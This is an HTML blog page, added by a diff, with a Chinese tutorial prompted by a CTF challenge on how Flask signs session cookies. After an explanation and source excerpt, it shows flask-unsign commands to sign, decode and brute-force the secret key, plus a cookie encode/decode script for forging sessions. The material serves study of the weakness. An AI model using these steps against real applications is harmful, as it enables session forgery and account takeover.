@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#d8f3ff">
+<title>flask中session的那些事</title>
+
+  <style>
+    :root { --wallpaper: url("/images/wallpaper.jpg"); }
+  </style>
+
+<link rel="stylesheet" href="/css/main.css">
+<script defer src="/js/main.js"></script>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head>
+<body class="theme-mac js is-article-page has-wallpaper">
+  <div class="menu-bar">
+  <div class="menu-left">
+    <div class="menu-apple" id="menu-apple">
+      <button class="menu-apple-btn" id="menu-apple-btn" type="button" aria-haspopup="true" aria-expanded="false" aria-label="Apple">
+        <svg class="menu-apple-icon" viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M16.36 2.2c0 1.05-.43 2.06-1.15 2.8-.8.83-2.12 1.47-3.25 1.39-.13-1.11.34-2.2 1.1-2.95.75-.81 2.06-1.42 3.3-1.24z"/>
+          <path d="M19.2 8.3c-.97-1.23-2.32-1.95-3.59-1.95-1.69 0-2.4.81-3.58.81-1.21 0-2.12-.79-3.6-.79-1.43 0-2.95.87-3.92 2.36-1.37 2.1-1.13 6.05 1.08 9.42.8 1.21 1.86 2.57 3.23 2.56 1.19-.01 1.53-.76 3.2-.76 1.67 0 1.98.76 3.19.75 1.41-.01 2.55-1.51 3.33-2.72.58-.89.8-1.34 1.24-2.35-3.26-1.24-3.78-5.87-.58-7.33z"/>
+        </svg>
+      </button>
+      <div class="menu-dropdown" id="menu-apple-dropdown" role="menu">
+        <button class="menu-dropdown-item" type="button" data-open="about">关于本机</button>
+        <div class="menu-divider"></div>
+        <button class="menu-dropdown-item" type="button">系统设置...</button>
+        <button class="menu-dropdown-item" type="button">App Store...</button>
+        <div class="menu-divider"></div>
+        <button class="menu-dropdown-item" type="button">关机...</button>
+      </div>
+    </div>
+    <span class="menu-item brand">Finder</span>
+    <span class="menu-item">File</span>
+    <span class="menu-item">Edit</span>
+    <span class="menu-item">View</span>
+    <span class="menu-item">Go</span>
+    <span class="menu-item">Window</span>
+    <span class="menu-item">Help</span>
+  </div>
+  <div class="menu-right">
+    <span class="menu-item status icon" aria-label="WeChat" title="WeChat">
+      <svg class="menu-icon" viewBox="0 0 24 24" role="img" aria-hidden="true">
+        <path d="M8.5 6.5c-3.2 0-5.8 2.1-5.8 4.8 0 1.7 1 3.3 2.6 4.2l-.6 2.3 2.3-1.2c.5.1 1 .2 1.5.2 3.2 0 5.8-2.1 5.8-4.8S11.7 6.5 8.5 6.5z"/>
+        <path d="M15.5 11c3.1 0 5.7 2.1 5.7 4.7 0 1.5-.8 2.9-2.2 3.8l.5 2-2.1-1.1c-.4.1-.9.1-1.4.1-3.1 0-5.7-2.1-5.7-4.7S12.4 11 15.5 11z"/>
+      </svg>
+    </span>
+    <span class="menu-item status icon" aria-label="QQ" title="QQ">
+      <svg class="menu-icon" viewBox="0 0 24 24" role="img" aria-hidden="true">
+        <path d="M7 18c-1.4 0-2.6 1-2.6 2.3 0 1.1 1 2.1 2.6 2.1h10c1.6 0 2.6-1 2.6-2.1 0-1.3-1.2-2.3-2.6-2.3"/>
+        <path d="M6.5 12.5c-1.2 2.1-1.7 4.2-1.7 5.5M17.5 12.5c1.2 2.1 1.7 4.2 1.7 5.5"/>
+        <path d="M12 4.2c-3.6 0-6.5 3-6.5 6.7 0 3.7 2.9 6.7 6.5 6.7s6.5-3 6.5-6.7c0-3.7-2.9-6.7-6.5-6.7z"/>
+      </svg>
+    </span>
+    <span class="menu-item status icon" aria-label="Bluetooth" title="Bluetooth">
+      <svg class="menu-icon" viewBox="0 0 24 24" role="img" aria-hidden="true">
+        <path d="M7 6l10 10-5 4V4l5 4-10 10"/>
+      </svg>
+    </span>
+    <span class="menu-item status icon" aria-label="Wi-Fi" title="Wi-Fi">
+      <svg class="menu-icon" viewBox="0 0 24 24" role="img" aria-hidden="true">
+        <path d="M3.5 9.5a12 12 0 0 1 17 0"/>
+        <path d="M6.8 12.8a7.2 7.2 0 0 1 10.4 0"/>
+        <path d="M10.4 16.4a2.6 2.6 0 0 1 3.2 0"/>
+        <circle cx="12" cy="19" r="1.2" fill="currentColor" stroke="none"/>
+      </svg>
+    </span>
+    <span class="menu-item status icon" aria-label="Battery" title="Battery">
+      <svg class="menu-icon" viewBox="0 0 24 24" role="img" aria-hidden="true">
+        <rect x="3" y="7.5" width="16" height="9" rx="2"/>
+        <rect x="19" y="10" width="2" height="4" rx="1"/>
+        <rect x="5.2" y="9.6" width="11.4" height="4.8" rx="1.2" fill="currentColor" stroke="none"/>
+      </svg>
+    </span>
+    <span class="menu-item" id="menu-time">--:--</span>
+  </div>
+</div>
+
+
+  <main class="desktop">
+    <div class="window wide reveal" style="--delay: 120ms;">
+      <div class="window-bar">
+        <div class="traffic">
+          <a class="traffic-dot red traffic-button" href="/" aria-label="Close"></a>
+          <span class="traffic-dot yellow"></span>
+          <button class="traffic-dot green traffic-button traffic-max" type="button" aria-label="Maximize"></button>
+        </div>
+        <div class="window-title">flask中session的那些事</div>
+        <div class="window-actions">
+          <a class="window-link" href="/">Desktop</a>
+          
+          
+            <a class="window-link" href="/2019/11/19/%E4%B9%8B%E5%89%8D%E7%9A%84/flask%E4%B8%ADsession%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/" target="_blank" rel="noopener">Share</a>
+          
+        </div>
+      </div>
+      <div class="window-body">
+        
+        <div class="article-head">
+          <h1 class="article-title">flask中session的那些事</h1>
+          
+            <div class="article-meta">2019-11-19</div>
+          
+        </div>
+        <article class="markdown">
+          <h3 id="楔子"><a href="#楔子" class="headerlink" title="楔子"></a>楔子</h3><p>在写HCTF2018-admin题目的时候，遇到了flask中session伪造的问题，打算研究一下</p>
+<span id="more"></span>
+
+
+<h3 id="一、cookie和session的一些小姿势"><a href="#一、cookie和session的一些小姿势" class="headerlink" title="一、cookie和session的一些小姿势"></a>一、cookie和session的一些小姿势</h3><h5 id="1、cookie："><a href="#1、cookie：" class="headerlink" title="1、cookie："></a>1、cookie：</h5><p>在网站中，http请求是无状态的。也就是说即使第一次和服务器连接后并且登录成功后，第二次请求服务器依然不能知道当前请求是哪个用户。cookie的出现就是为了解决这个问题，第一次登录后服务器返回一些数据（cookie）给浏览器，然后浏览器保存在本地，当该用户发送第二次请求的时候，就会自动的把上次请求存储的cookie数据自动的携带给服务器，服务器通过浏览器携带的数据就能判断当前用户是哪个了。cookie存储的数据量有限，不同的浏览器有不同的存储大小，但一般不超过4KB。因此使用cookie只能存储一些小量的数据。</p>
+<h5 id="2、session"><a href="#2、session" class="headerlink" title="2、session:"></a>2、session:</h5><p>session和cookie的作用有点类似，都是为了存储用户相关的信息。不同的是，cookie是存储在本地浏览器，而session存储在服务器。存储在服务器的数据会更加的安全，不容易被窃取。但存储在服务器也有一定的弊端，就是会占用服务器的资源，但现在服务器已经发展至今，一些session信息还是绰绰有余的。</p>
+<h5 id="3、cookie和session结合使用：（其实个人感觉就是单纯用了cookie的功能）"><a href="#3、cookie和session结合使用：（其实个人感觉就是单纯用了cookie的功能）" class="headerlink" title="3、cookie和session结合使用：（其实个人感觉就是单纯用了cookie的功能）"></a>3、cookie和session结合使用：（其实个人感觉就是单纯用了cookie的功能）</h5><p>web开发发展至今，cookie和session的使用已经出现了一些非常成熟的方案。在如今的市场或者企业里，一般有两种存储方式：</p>
+<p>1、存储在服务端：通过cookie存储一个session_id，然后具体的数据则是保存在session中。如果用户已经登录，则服务器会在cookie中保存一个session_id，下次再次请求的时候，会把该session_id携带上来，服务器根据session_id在session库中获取用户的session数据。就能知道该用户到底是谁，以及之前保存的一些状态信息。这种专业术语叫做server side session。</p>
+<p>2、将session数据加密，然后存储在cookie中。这种专业术语叫做client side session。flask采用的就是这种方式，但是也可以替换成其他形式。</p>
+<h3 id="二、源码分析一下"><a href="#二、源码分析一下" class="headerlink" title="二、源码分析一下"></a>二、源码分析一下</h3><p>他的session存储在客户端的cookie字段中，为了防止session篡改，flask进行了如下的处理，代码存放在flask模块中<code>python3\Lib\site-packages\flask\sessions.py</code>文件中。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SecureCookieSessionInterface</span>(<span class="title class_ inherited__">SessionInterface</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;The default session interface that stores sessions in signed cookies</span></span><br><span class="line"><span class="string">    through the :mod:`itsdangerous` module.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#: the salt that should be applied on top of the secret key for the</span></span><br><span class="line">    <span class="comment">#: signing of cookie based sessions.</span></span><br><span class="line">    salt = <span class="string">&quot;cookie-session&quot;</span></span><br><span class="line">    <span class="comment">#: the hash function to use for the signature.  The default is sha1</span></span><br><span class="line">    digest_method = <span class="built_in">staticmethod</span>(hashlib.sha1)</span><br><span class="line">    <span class="comment">#: the name of the itsdangerous supported key derivation.  The default</span></span><br><span class="line">    <span class="comment">#: is hmac.</span></span><br><span class="line">    key_derivation = <span class="string">&quot;hmac&quot;</span></span><br><span class="line">    <span class="comment">#: A python serializer for the payload.  The default is a compact</span></span><br><span class="line">    <span class="comment">#: JSON derived serializer with support for some extra Python types</span></span><br><span class="line">    <span class="comment">#: such as datetime objects or tuples.</span></span><br><span class="line">    serializer = session_json_serializer</span><br><span class="line">    session_class = SecureCookieSession</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_signing_serializer</span>(<span class="params">self, app</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> app.secret_key:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        signer_kwargs = <span class="built_in">dict</span>(</span><br><span class="line">            key_derivation=self.key_derivation, digest_method=self.digest_method</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> URLSafeTimedSerializer(</span><br><span class="line">            app.secret_key,</span><br><span class="line">            salt=self.salt,</span><br><span class="line">            serializer=self.serializer,</span><br><span class="line">            signer_kwargs=signer_kwargs,</span><br><span class="line">        )</span><br></pre></td></tr></table></figure>
+
+<p>最后生成的session长这样<br><code>json-&gt;zlib-&gt;base64后的源字符串 . 时间戳 . hmac签名信息</code><br>比如我生成这样的<code>eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6InN0NGNrIn0.Xbn4pw.6KQvoMiQZo1Ttjr4dFJ7e0AN45U</code><br>这是由<code>&#123;&#39;_permanent&#39;: True, &#39;username&#39;: &#39;st4ck&#39;&#125;</code>，密钥为<code>admin</code>生成的</p>
+<h3 id="三、flask的session实战"><a href="#三、flask的session实战" class="headerlink" title="三、flask的session实战"></a>三、flask的session实战</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> timedelta</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>]=<span class="string">&#x27;admin&#x27;</span>   <span class="comment">#设置为24位的字符,每次运行服务器都是不同的，所以服务器启动一次上次的session就清除。</span></span><br><span class="line">app.config[<span class="string">&#x27;PERMANENT_SESSION_LIFETIME&#x27;</span>]=timedelta(days=<span class="number">7</span>) <span class="comment">#设置session的保存时间。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    session.permanent=<span class="literal">True</span>  <span class="comment">#默认session的时间持续31天</span></span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;st4ck&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取session</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/get/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>():</span><br><span class="line">    <span class="keyword">return</span>  session.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#删除session</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/delete/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    <span class="built_in">print</span>(session.get(<span class="string">&#x27;username&#x27;</span>))</span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(session.get(<span class="string">&#x27;username&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;delete&#x27;</span></span><br><span class="line"><span class="comment">#清楚session</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/clear/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear</span>():</span><br><span class="line">    <span class="built_in">print</span>(session.get(<span class="string">&#x27;username&#x27;</span>))</span><br><span class="line">    session.clear()</span><br><span class="line">    <span class="built_in">print</span>(session.get(<span class="string">&#x27;username&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;clear&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>我们运行&#x2F;,然后get请求后获得</p>
+<p><img src="/2019/11/19/%E4%B9%8B%E5%89%8D%E7%9A%84/flask%E4%B8%ADsession%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/1.png" alt="img"></p>
+<p>获得session为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6InN0NGNrIn0.Xbn3eg.zBDV4huj8XGiRbFjSPMZq1HeV5Y</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="四、session安全问题"><a href="#四、session安全问题" class="headerlink" title="四、session安全问题"></a>四、session安全问题</h3><p>其实生成上面的session居然是可以破解的！！！但是没有SECRET_KEY我们无法伪造，可以选择爆破但是一定要拿到SECRET_KEY才能伪造</p>
+<h4 id="方法1：使用flask-unsign工具"><a href="#方法1：使用flask-unsign工具" class="headerlink" title="方法1：使用flask-unsign工具"></a>方法1：使用<a target="_blank" rel="noopener" href="https://github.com/Paradoxis/Flask-Unsign">flask-unsign</a>工具</h4><p>安装<br><code>$ pip3 install flask-unsign</code><br>命令行就可以直接使用<code>$ flask-unsign</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\38138\Desktop&gt;flask-unsign --sign --cookie &quot;&#123;&#x27;_permanent&#x27;: True, &#x27;username&#x27;: &#x27;st4ck&#x27;&#125;&quot; --secret &quot;secret&quot;</span><br><span class="line">eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6InN0NGNrIn0.Xbn-9Q.uNm3a4894t-TZogqY-Ab4M0HDz4</span><br><span class="line"></span><br><span class="line">C:\Users\38138\Desktop&gt;flask-unsign --decode --cookie &quot;eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6InN0NGNrIn0.Xbn-9Q.uNm3a4894t-TZogqY-Ab4M0HDz4&quot;</span><br><span class="line">&#123;&#x27;_permanent&#x27;: True, &#x27;username&#x27;: &#x27;st4ck&#x27;&#125;</span><br></pre></td></tr></table></figure>
+<p>爆破key</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --unsign --cookie  &quot;eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6Imd1ZXN0In0.Xm2ZFg.-quLR22o3jUH0PzdlVtj4m4Aecg&quot;</span><br></pre></td></tr></table></figure>
+<h4 id="方法2：使用脚本"><a href="#方法2：使用脚本" class="headerlink" title="方法2：使用脚本"></a>方法2：使用脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line"><span class="comment"># Abstract Base Classes (PEP 3119)</span></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] &lt; <span class="number">3</span>: <span class="comment"># &lt; 3.0</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Must be using at least Python 3&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.version_info[<span class="number">0</span>] == <span class="number">3</span> <span class="keyword">and</span> sys.version_info[<span class="number">1</span>] &lt; <span class="number">4</span>: <span class="comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> ABCMeta, abstractmethod</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># &gt; 3.4</span></span><br><span class="line">    <span class="keyword">from</span> abc <span class="keyword">import</span> ABC, abstractmethod</span><br><span class="line"></span><br><span class="line"><span class="comment"># Lib for argument parsing</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="comment"># external Imports</span></span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MockApp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, secret_key</span>):</span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">3</span> <span class="keyword">and</span> sys.version_info[<span class="number">1</span>] &lt; <span class="number">4</span>: <span class="comment"># &gt;= 3.0 &amp;&amp; &lt; 3.4</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">FSCM</span>(metaclass=ABCMeta):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">secret_key, session_cookie_structure</span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = <span class="built_in">dict</span>(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">session_cookie_value, secret_key=<span class="literal">None</span></span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span>(secret_key==<span class="literal">None</span>):</span><br><span class="line">                    compressed = <span class="literal">False</span></span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> payload.startswith(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">                        compressed = <span class="literal">True</span></span><br><span class="line">                        payload = payload[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Decoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"><span class="keyword">else</span>: <span class="comment"># &gt; 3.4</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">FSCM</span>(<span class="title class_ inherited__">ABC</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">secret_key, session_cookie_structure</span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = <span class="built_in">dict</span>(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">session_cookie_value, secret_key=<span class="literal">None</span></span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span>(secret_key==<span class="literal">None</span>):</span><br><span class="line">                    compressed = <span class="literal">False</span></span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> payload.startswith(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">                        compressed = <span class="literal">True</span></span><br><span class="line">                        payload = payload[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">                    data = payload.split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    <span class="keyword">if</span> compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> data</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> s.loads(session_cookie_value)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Decoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(FSCM.decode(<span class="string">&quot;eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2VybmFtZSI6InN0NGNrIn0.Xbn3eg.zBDV4huj8XGiRbFjSPMZq1HeV5Y&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2019/11/19/%E4%B9%8B%E5%89%8D%E7%9A%84/flask%E4%B8%ADsession%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/2.png" alt="img"></p>
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>flask session 加解密工具：<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a><br>SECRET_KEY 爆破工具:<a target="_blank" rel="noopener" href="https://github.com/Paradoxis/Flask-Unsign">https://github.com/Paradoxis/Flask-Unsign</a></p>
